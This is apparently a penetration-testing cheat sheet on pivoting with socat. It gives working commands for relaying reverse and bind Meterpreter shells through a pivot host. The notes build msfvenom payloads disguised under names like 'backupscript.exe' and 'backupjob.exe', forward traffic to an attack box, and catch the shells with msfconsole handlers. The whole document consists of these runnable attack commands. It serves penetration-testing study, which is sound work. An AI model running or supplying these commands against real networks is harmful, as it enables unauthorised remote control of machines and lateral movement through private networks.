No need for SSH tunneling

Socat acts as a redirector that can listen on one host and port and forward that data to another IP address and port

Socat Reverse shell redirection
```bash
# on pivot_host, start listener (8080) and forward to <attack_box:80>
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

# Create msfvenom meterpreter payload for internal_ip. Lhost=pivot_box_internal_ip, lport:pivot_box_listen_port
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

# Start msfconsole handler, catch shell
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport <attack_box_forward_port>
run
```

Socat Bind Shell Redirection
```bash
# create bind shell with msfvenom, run on internal box
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443

# start socat bind shell listener on PIVOT_box, listens on 8080, forwards to internal ip:8443
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

# configure bind multi/handler
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST <pivot_external_ip>
set LPORT <pivot_listen_port>
run
```